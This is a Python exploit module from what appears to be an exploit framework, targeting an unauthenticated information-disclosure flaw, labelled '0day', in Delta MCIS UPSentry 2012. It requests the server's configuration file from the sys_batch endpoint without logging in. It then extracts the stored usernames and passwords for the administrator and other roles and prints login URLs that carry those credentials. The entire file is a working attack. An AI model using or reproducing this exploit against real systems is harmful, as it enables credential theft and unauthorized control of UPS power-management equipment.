#!/usr/bin/env python

import urllib2
import ConfigParser
import StringIO
import ssl
from collections import OrderedDict
from Sploit import Sploit
from core.WebHelper import FormPoster

ssl._create_default_https_context = ssl._create_unverified_context

INFO = {}
INFO['NAME'] = 'efa_delta_mcis_upsentry2012_info_disclosure'
INFO['DESCRIPTION'] = 'Delta MCIS UPSentry 2012 Info Disclosure'
INFO['VENDOR'] = 'http://www.deltapowersolutions.com/en/mcis/upsentry.php'
INFO['CVE Name'] = '0day'
INFO['DOWNLOAD_LINK'] = 'http://59.125.232.140/ups/en/index.aspx'
INFO['LINKS'] = []
INFO['CHANGELOG'] = '4 Dec 2017'
INFO['PATH'] = 'General/'
INFO['NOTES'] = """    Vulnerability allows remote attackers to obtain config file content.
Authentication is not required to exploit this vulnerability.
Tested against UPSentry 2012 v02.01.13 on Windows 7 SP1 x64.
"""

OPTIONS = OrderedDict()
OPTIONS['HOST'] = '192.168.1.176'
OPTIONS['PORT'] = 80
OPTIONS['SSL'] = False


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', OPTIONS['HOST'])
        self.port = self.args.get('PORT', OPTIONS['PORT'])
        self.ssl = self.args.get('SSL', OPTIONS['SSL'])

    def make_url(self, path=''):
        proto = 'https' if self.ssl else 'http'
        url = '%s://%s:%s/%s' % (proto, self.host, self.port, path)
        return url

    def run(self):
        #Get options from gui
        self.args()
        url = self.make_url()
        self.log('[*] Checking connection to %s' % url)
        urllib2.urlopen(url)
        self.log('[*] Trying to recieve server config')
        form = FormPoster()
        form.add_field('DL_SYSTEM', 'Download')
        req = form.post(self.make_url('delta/sys_batch'))
        res = urllib2.urlopen(req).read()
        self.log('[+]\r\n' + res)
        buf = StringIO.StringIO(res)
        config = ConfigParser.ConfigParser()
        config.readfp(buf)
        self.log('[*] Use this urls to login as registered user:')
        roles = {'0': "Administrator", '1': "Device Manager", '2': "Read Only User"}
        for i in range(3):
            user = config.get('Web', 'User%s' % i)
            pwd = config.get('Web', 'Password%s' % i)
            url = self.make_url('?encrypt=1&account=%s&password=%s' % (user, pwd))
            self.log('[+] '+ roles[str(i)] + ': ' + url)
        self.finish(True)


if __name__ == '__main__':
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()